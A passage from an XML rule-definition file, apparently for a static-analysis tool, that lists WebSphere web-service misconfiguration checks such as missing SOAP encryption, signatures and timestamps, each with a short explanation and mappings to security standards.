																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[23]  <em>Web Services Security SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_inbound_encryption
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Inbound Encryption
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Inbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_inbound_signature
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Inbound Signature
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Inbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing signature means the integrity of a SOAP message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the knowledge of the sender or the receiver. Without a signature, the receiver cannot cryptographically verify that the contents of a message really originated with the sender.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 345</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_inbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Inbound Timestamp
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Inbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_outbound_encryption
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Outbound Encryption
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Outbound
			Encryption
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Unencrypted messages fail to protect confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Encryption at the SOAP message level ensures true end-to-end confidentiality. SOAP messages can be sent over a number transport protocols such as HTTPS, HTTP, TCP, SMTP, UDP, etc. Message-level encryption ensures the confidentiality of the message regardless of the transport protocol. A common scenario among web services is to relay SOAP messages between services, so message-level encryption means message senders and receivers do not need to worry about all transport security between any relay points.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_outbound_signature
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Outbound Signature
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Outbound
			Signature
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing signature means the integrity of a SOAP message cannot be guaranteed.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Any part of a message that is not signed has the potential to be intercepted and modified without the knowledge of the sender or the receiver. Without a signature, the receiver cannot cryptographically verify that the contents of a message really originated with the sender.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3860 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3860 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3860 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3860 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 245</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_outbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Outbound Timestamp
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Outbound
			Timestamp
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A missing timestamp can leave a SOAP message open to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A Security timestamp indicates a message's freshness. If an attacker intercepts a message retransmits it at a later time, the receiver can reject the replay attack because the timestamp will indicate that the message is stale. Optionally, timestamps can include an expiration attribute which places a hard limit on how long security semantics are valid.<br><br>To prevent attackers from tampering with timestamps, timestamps should be signed. Without a signed timestamp, it might be possible to intercept a SOAP message, modify the timestamp, and send the message on without the receiver's knowledge. Under these circumstances, an attacker can potentially trick a recipient into accepting a malicious message.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_missing_timestamp_expiration
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Missing Timestamp Expiration
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Missing Timestamp
			Expiration
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  A SOAP message with a timestamp that does not expire is vulnerable to replay attacks.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  When a timestamp expires, any security semantics sent with the timestamp should expire as well. Therefore, timestamps without an expiration could allow security semantics (such as UsernameToken credentials) to remain valid indefinitely.<br><br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A6 Security Misconfiguration</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3870 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3870 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3870 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3870 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - FIPS200 - (FISMA) <em>CM</em> <br></p>
																									   <p>[9] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 254</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[15]  <em>Web Services Security SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_outbound_ws_security_not_enabled
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Outbound WS-Security Not Enabled
		</internalKey>
		<name>WebSphere Service Provider Misconfiguration: Outbound
			WS-Security Not Enabled
		</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Service providers that don't use WS-Security make it hard to guarantee message integrity or confidentiality.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  WS-Security is an enhancement to SOAP that provides end-to-end message integrity and confidential regardless of the transport protocol. When WS-Security is not used, message rely on transport security for integrity and confidentiality. If a service relays messages to other services, messages are exposed to the weakest transport mechanism used between relay points. WS-Security removes the transport security dependency and builds security into the message itself.<br><br> The absence of an <code>&lt;securityResponseGeneratorServiceConfig&gt;</code> tag in the IBM WebSphere WS-Security server deployment descriptor extension file indicates that inbound message security is not enabled.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A10 Insecure Configuration Management</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A9 Insecure Communications</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A9 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - FIPS200 - (FISMA) <em>CM, SC</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 311</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 319</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authentication</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M3 Insufficient Transport Layer Protection</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 311</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 4.1, Requirement 6.5.10</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 4.1, Requirement 6.5.4</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-8 Transmission Confidentiality and Integrity (P1)</em> <br></p>
																									   <p>[22]  <em>Web Services Handbook for WebSphere Application Server 6.1</em> IBM Redbooks<br></p>
																									   <p>[23]  <em>Web Services Security SOAP Message Security 1.1</em> OASIS<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>environment</tag>
	</rule>
	<rule>
		<key>environment_websphere_service_provider_misconfiguration_unsigned_inbound_timestamp
		</key>
		<internalKey>Environment/WebSphere Service Provider
			Misconfiguration/Unsigned Inbound Timestamp
